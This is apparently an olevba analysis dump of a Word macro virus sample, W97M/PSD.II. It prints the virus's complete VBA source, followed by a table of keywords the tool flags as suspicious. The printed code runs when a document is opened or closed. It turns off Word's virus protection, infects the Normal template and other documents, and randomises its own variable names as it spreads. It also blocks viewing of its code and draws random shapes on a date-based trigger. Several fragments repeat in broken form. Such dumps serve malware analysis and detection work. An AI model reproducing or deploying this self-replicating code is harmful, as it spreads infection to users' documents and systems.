olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Psd.b-4a0e153801d2b9016e4230157465b55775b2a9c6
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Psd.b-4a0e153801d2b9016e4230157465b55775b2a9c6 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
On Error Resume Next
Options.ConfirmConversions = 0: Options.VirusProtection = 0: Options.SaveNormalPrompt = 0
If Day(Now) = Minute(Now) Then
Randomize: For ND83 = 1 To (Int(Rnd * 70))
ActiveDocument.Shapes.AddShape(Int(Rnd * 120), Int(Rnd * 200), Int(Rnd * 500), Int(Rnd * 500), Int(Rnd * 500)).Select
Selection.ShapeRange.Fill.ForeColor.RGB = RGB(Int(Rnd * 255), Int(Rnd * 255), Int(Rnd * 255))
Selection.ShapeRange.Fill.Visible = msoTrue
Selection.ShapeRange.Fill.Solid: Next ND83: End If
RO257 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
SE872 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
If Left(ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Pri" Then
Set TO3067 = ActiveDocument.VBProject.VBComponents.Item(1)
PF1234 = True
End If
If Left(NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Pri" Then
Set TO3067 = NormalTemplate.VBProject.VBComponents.Item(1)
JM1278 = True
Call EJ3348_FK762
ActiveDocument.Saved = True
End If
If JM1278 <> True And PF1234 <> True Then GoTo OG7399
If JM1278 = True Then TO3067.CodeModule.AddFromString ("Private Sub Document_Close()" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, RO257 - 1) & vbCr & "Sub ViewVBCode()" & vbCr & "Application.Quit SaveChanges:=wdDoNotSaveChanges" & vbCr & "End Sub")
If PF1234 = True Then TO3067.CodeModule.AddFromString ("Private Sub Document_Open()" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, SE872 - 4))
OG7399:
If SE872 <> 0 And RO257 = 0 And (InStr(1, ActiveDocument.Name, "Document") = False) Then
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
ElseIf (InStr(1, ActiveDocument.Name, "Document") <> False) Then
ActiveDocument.Saved = True: End If
End Sub 'W97M/PSD.II ...logically delicious! [(c)1998 ALT-F11 code hack]
Private Function EJ3348_FK762()
On Error Resume Next
Randomize
Dim r1(1 To 15) As String
r1(1) = "PA4917": r1(2) = "PG1329": r1(3) = "ML551": r1(4) = "OP7811": r1(5) = "FK762": r1(6) = "RO257"
r1(7) = "SE872": r1(8) = "PF1234":: r1(9) = "TO3067": r1(10) = "JM1278": r1(11) = "OG7399": r1(12) = "EJ3348": r1(13) = "AG283": r1(14) = "AM8373": r1(15) = "ND83"
For ND83 = 1 To 15
a1 = (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & Int(Rnd * 100) & Int(Rnd * 100)
Call FK762(a1, r1(ND83))
Next ND83
End Function 'VAMP v1.0 [thanks Vic!]
Private Function FK762(AM8373, AG283 As String)
On Error Resume Next
Dim PA4917 As Long: Dim PG1329 As Long: Dim ML551 As Long: Dim OP7811 As Long
With ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
PA4917 = 1: PG1329 = 1: ML551 = .CountOfLines: OP7811 = Len(.Lines(.CountOfLines, 1))
Do While .Find(AG283, PA4917, PG1329, ML551, OP7811, True)
strline = .Lines(PA4917, 1)
strline = Left(strline, PG1329 - 1) & AM8373 & Mid(strline, OP7811)
.replaceline PA4917, strline
PA4917 = ML551 + 1: PG1329 = 1:
ML551 = .CountOfLines
OP7811 = Len(.Lines(.CountOfLines, 1))
Loop
End With
End Function

Private Function Test()
Options.ConfirmConversions = 0: Options.VirusProtection = 0: Options.SaveNormalPrompt = 0
If Day(Now) = Minute(Now) Then
Randomize: For ND83 = 1 To (Int(Rnd * 70))
ActiveDocument.Shapes.AddShape(Int(Rnd * 120), Int(Rnd * 200), Int(Rnd * 500), Int(Rnd * 500), Int(Rnd * 500)).Select
Selection.ShapeRange.Fill.ForeColor.RGB = RGB(Int(Rnd * 255), Int(Rnd * 255), Int(Rnd * 255))
Selection.ShapeRange.Fill.Visible = msoTrue
Selection.ShapeRange.Fill.Solid: Next ND83: End If
RO257 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
SE872 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
If Left(ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Pri" Then
Set TO3067 = ActiveDocument.VBProject.VBComponents.Item(1)
PF1234 = True
End If
If Left(NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Pri" Then
Set TO3067 = NormalTemplate.VBProject.VBComponents.Item(1)
JM1278 = True
Call EJ3348_FK762
ActiveDocument.Saved = True
End If
If JM1278 <> True And PF1234 <> True Then GoTo OG7399
If JM1278 = True Then TO3067.CodeModule.AddFromString ("Private Sub Document_Close()" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, RO257 - 1) & vbCr & "Sub ViewVBCode()" & vbCr & "Application.Quit SaveChanges:=wdDoNotSaveChanges" & vbCr & "End Sub")
If PF1234 = True Then TO3067.CodeModule.AddFromString ("Private Sub Document_Open()" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, SE872 - 4))
OG7399:
If SE872 <> 0 And RO257 = 0 And (InStr(1, ActiveDocument.Name, "Document") = False) Then
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
ElseIf (InStr(1, ActiveDocument.Name, "Document") <> False) Then
ActiveDocument.Saved = True: End If
End Function 'W97M/PSD.II ...logically delicious! [(c)1998 ALT-F11 code hack]

()
On Error Resume Next
Randomize
Dim r1(1 To 15) As String
r1(1) = "PA4917": r1(2) = "PG1329": r1(3) = "ML551": r1(4) = "OP7811": r1(5) = "FK762": r1(6) = "RO257"
r1(7) = "SE872": r1(8) = "PF1234":: r1(9) = "TO3067": r1(10) = "JM1278": r1(11) = "OG7399": r1(12) = "EJ3348": r1(13) = "AG283": r1(14) = "AM8373": r1(15) = "ND83"
For ND83 = 1 To 15
a1 = (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & Int(Rnd * 100) & Int(Rnd * 100)
Call FK762(a1, r1(ND83))
Next ND83
End Function 'VAMP v1.0 [thanks Vic!]

)
On Error Resume Next
Dim PA4917 As Long: Dim PG1329 As Long: Dim ML551 As Long: Dim OP7811 As Long
With ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
PA4917 = 1: PG1329 = 1: ML551 = .CountOfLines: OP7811 = Len(.Lines(.CountOfLines, 1))
Do While .Find(AG283, PA4917, PG1329, ML551, OP7811, True)
strline = .Lines(PA4917, 1)
strline = Left(strline, PG1329 - 1) & AM8373 & Mid(strline, OP7811)
.replaceline PA4917, strline
Sub ViewVBCode()
Application.Quit SaveChanges:=wdDoNotSaveChanges
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Base64    |4?7                 |ND83                                         |
|String    |                    |                                             |
+----------+--------------------+---------------------------------------------+

